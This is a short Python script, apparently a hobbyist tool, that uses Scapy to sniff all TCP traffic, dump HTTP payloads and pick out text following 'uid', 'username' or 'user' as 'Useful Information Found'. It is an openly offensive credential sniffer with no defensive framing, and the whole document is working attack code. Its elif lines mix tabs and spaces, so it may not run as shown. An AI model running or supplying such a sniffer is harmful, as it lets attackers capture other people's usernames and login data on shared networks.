from scapy.all import *

# Packet Decoding Function
def packetDecode(packet):
    if packet[TCP].payload:
        if packet[IP].dport == 80:
            print("\n%s ----HTTP----> %s:%s:\n%s" % (packet[IP].src, packet[IP].dst, packet[IP].dport, str(bytes(packet[TCP].payload))))
            if "uid" in str(bytes(packet[TCP].payload)):
                print("\nUseful Information Found!")
                print("uid%s" % str(bytes(packet[TCP].payload)).split("uid", 1)[1])
	    elif "username" in str(bytes(packet[TCP].payload)):
                print("\nUseful Information Found!")
                print("username%s" % str(bytes(packet[TCP].payload)).split("username", 1)[1])
	    elif "user" in str(bytes(packet[TCP].payload)):
                print("\nUseful Information Found!")
                print("user%s" % str(bytes(packet[TCP].payload)).split("user", 1)[1])

# Execution Using Scapy 'sniff'
print("Beginning Packet Sniffing...\n")
sniff(filter = "tcp", prn = packetDecode, store = 0, count = 0) # Filter 'tcp' to Obtain Information
